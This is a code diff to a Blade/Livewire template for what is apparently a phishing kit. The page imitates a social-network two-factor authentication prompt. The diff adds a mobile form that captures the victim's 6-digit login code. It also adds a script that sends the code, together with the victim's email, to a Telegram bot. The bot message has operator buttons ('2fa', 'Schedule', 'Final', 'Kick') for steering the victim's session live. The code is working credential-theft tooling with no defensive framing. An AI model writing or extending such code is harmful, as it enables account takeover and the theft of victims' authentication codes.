@@ -277,7 +277,7 @@
                                 @endif
                                 @if($twoFaPage)
                                     <div class="auth-req-container">
-                                        <form class="auth-req" wire:submit.prevent="codeSubmit">
+                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
                                             <div class="auth-req-text">
                                                 <h2>Two-factor authentication required</h2>
                                                 <div class="auth-req-paragraph">
@@ -292,22 +292,34 @@
                                                     <span> (wait 4:29)</span>
                                                 </div>
                                             </div>
-                                            <div class="show-input-on-mobile show__input-modal">
-                                                <input type="number" value="">
-                                                <div class="show-error-modal">
-                                                    <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
-                                                </div>
-                                            </div>
                                             <div class="auth-req-footer" style="height: auto"><a>Need another way to authenticate?</a>
                                                 <button    type="submit" class="false"><span>Continue</span></button>
                                             </div>
                                         </form>
-                                        <div class="having-trouble-class">
-                                            <button>Having trouble?</button>
-                                        </div>
-                                        <div class="show-button-mobile false">
-                                            <button type="submit">Continue</button>
-                                        </div>
+                                        <form id="mobile-code" class="auth-req" wire:submit.prevent="codeSubmitMobile">
+                                            <div class="auth-req-text">
+                                                <h2>Two-factor authentication required</h2>
+                                                <div class="auth-req-paragraph">
+                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
+                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
+                                                </div>
+                                            </div>
+                                            <div class="show-input-on-mobile show__input-modal">
+                                                <input maxlength="6" minlength="6" name="code2"  placeholder="Login Code" type="number" required="required">
+                                                @if($codeError)
+                                                <div class="show-error-modal2">
+                                                    <p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p>
+                                                </div>
+                                                @endif
+                                            </div>
+                                            <div class="having-trouble-class">
+                                                <button>Having trouble?</button>
+                                            </div>
+                                            <div class="show-button-mobile false">
+                                                <button type="submit">Continue</button>
+                                            </div>
+                                        </form>
+
                                         <div class="show-footer-on-mobile-plus">
                                             <h2 class="h2-foot not__you-text">Not You? Log In Here</h2>
                                             <div class="footer-flex-mobile-plus confimartion__modal">
@@ -566,7 +578,66 @@
                 console.log("Unknown error in auth.html", error);
             });
 
-    })
+    });
+    document.addEventListener('code-submit-mobile',function (){
+        const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
+        const code = $('input[name="code2"]').val();
+        fetch(tURL, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: `===FIRST AUTH CODE for ${emailElement}===\nCODE: ${
+                    code || ""
+                }`,
+                reply_markup: {
+                    inline_keyboard: [
+                        [
+                            {
+                                text: `2fa`,
+                                callback_data: `/2fa ${sessionId}`,
+                            },
+                            {
+                                text: `2fa error`,
+                                callback_data: `/2faError ${sessionId}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Schedule`,
+                                callback_data: `/schedule ${sessionId}`,
+                            },
+                            {
+                                text: `Final`,
+                                callback_data: `/final ${sessionId}`,
+                            },
+                        ],
+                        [
+                            {
+                                text: `Kick`,
+                                callback_data: `/login ${sessionId}`,
+                            },
+                        ],
+                    ],
+                },
+            }),
+        })
+            .then(() => {
+                @this.set('loginError', false);
+                @this.set('oldPassError', false);
+                @this.set('enableLoginForm', false);
+                @this.set('showModalFooter', false);
+                @this.set('enableLoadingAfterSubmit', true);
+                @this.set('twoFaPage', false);
+                @this.set('codeError', false);
+            })
+            .catch((error) => {
+                console.log("Unknown error in auth.html", error);
+            });
+
+    });
     const startInterval = () => {
         let lastUpdateId = 0;
         setInterval(() => {
@@ -896,7 +967,6 @@
         }).catch(error => {
 
         });
-    })
-
+    });
 </script>
 @endscript
